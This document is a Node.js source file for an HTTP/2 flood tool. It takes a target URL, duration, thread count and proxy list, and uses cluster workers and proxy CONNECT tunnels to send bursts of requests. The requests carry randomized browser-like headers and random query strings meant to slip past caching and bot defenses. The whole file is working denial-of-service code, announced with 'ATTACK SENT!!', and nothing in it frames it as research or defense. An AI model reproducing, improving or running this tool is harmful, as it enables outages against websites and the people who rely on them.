const http2 = require('http2-wrapper');
const fs = require('fs');
const url = require('url');
const net = require('net');
const tls = require('tls');
const cluster = require('cluster');
const { constants } = require('http2');

if (process.argv.length <= 4) {
    console.log(`node ${process.argv[1]} url time thread proxyfile`);
    process.exit(-1);
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

const target = process.argv[2];
const parsedTarget = url.parse(target);
const host = parsedTarget.host;
const threads = parseInt(process.argv[4], 10);
const time = parseInt(process.argv[3], 10);
const proxyFile = process.argv[5];

require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

let userAgents = [];
try {
    userAgents = fs.readFileSync('ua.txt', 'utf8').split('\n');
} catch (e) {}

let proxies = [];
try {
    proxies = fs.readFileSync(proxyFile, 'utf8').split('\n');
} catch (e) {}

if (cluster.isMaster) {
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }
    console.log(`ATTACK SENT!!`);
} else {
    setInterval(startFlood, 1);
}

function startFlood() {
    const int = setInterval(() => {
        const proxy = proxies[Math.floor(Math.random() * proxies.length)].trim();
        const parsedProxy = proxy.split(':');
        const version = Math.floor(Math.random() * (124 - 113 + 1)) + 113;
        const secFetchUser = Math.random() < 0.5 ? "?0" : "?1";
        const acceptEncoding = Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, br, zstd";
        const secFetchDest = Math.random() < 0.5 ? "document" : "empty";
        const secFetchMode = Math.random() < 0.5 ? "navigate" : "cors";
        const secFetchSite = Math.random() < 0.5 ? "none" : "same-site";
        const accept = Math.random() < 0.5 ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" : "application/json";
        const priority = Math.random() < 0.5 ? "u=0, i" : "u=1, i";
        const platform = "Windows";

        const proxyOptions = {
            host: parsedProxy[0],
            port: parseInt(parsedProxy[1], 10),
            address: parsedTarget.host + ":443",
            timeout: 25
        };

        connectThroughProxy(proxyOptions, (connection) => {
            if (!connection) return;

            const client = http2.connect(parsedTarget.href, { createConnection: () => connection });

                let headers = {
                    ":authority": parsedTarget.host,
                    ":method": "GET",
                    ":path": parsedTarget.path + "?" + "dragonc2=" + generateRandomString(13, 13),
                    ":scheme": "https",
                    'sec-ch-ua': `"Firefox";v="${version}", "Gecko";v="20100101", "Mozilla";v="${version}"`,
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': `"${platform}"`,
                    'user-agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${version}.0) Gecko/20100101 Firefox/${version}.0`,
                    'accept': accept,
                    'sec-fetch-site': secFetchSite,
                    'sec-fetch-mode': secFetchMode,
                    'sec-fetch-user': secFetchUser,
                    'sec-fetch-dest': secFetchDest,
                    'accept-encoding': acceptEncoding,
                    'accept-language': 'ru,en-US;q=0.9,en;q=0.8',
                    'priority': priority,
                };
            
            for (let i = 0; i < 30; i++) {
                const req = client.request(headers);

                req.end();
            }
        });
    }, 100);

    setTimeout(() => {
        clearInterval(int);
    }, time * 1000);
}

function connectThroughProxy(proxyOptions, callback) {
    const connection = net.connect(proxyOptions.port, proxyOptions.host, () => {
        const request = `CONNECT ${proxyOptions.address} HTTP/1.1\r\nHost: ${proxyOptions.address}\r\n\r\n`;
        connection.write(request);

        connection.once('data', (data) => {
            if (data.toString().indexOf('200') !== -1) {
                const tlsOptions = {
                    host: proxyOptions.address.split(':')[0],
                    port: 443,
                    secure: true,
                    servername: proxyOptions.address.split(':')[0],
                    socket: connection,
                    rejectUnauthorized: false,
                    ALPNProtocols: ['h2']
                };

                const tlsConnection = tls.connect(tlsOptions, () => {
                    if (tlsConnection.authorized) {
                        callback(tlsConnection);
                    } else {
                        tlsConnection.destroy();
                        callback(null);
                    }
                });

                tlsConnection.on('error', () => {
                    callback(null);
                });
            } else {
                connection.destroy();
                callback(null);
            }
        });

        connection.setTimeout(proxyOptions.timeout * 1000, () => {
            connection.destroy();
            callback(null);
        });
    });

    connection.on('error', () => {
        callback(null);
    });
}
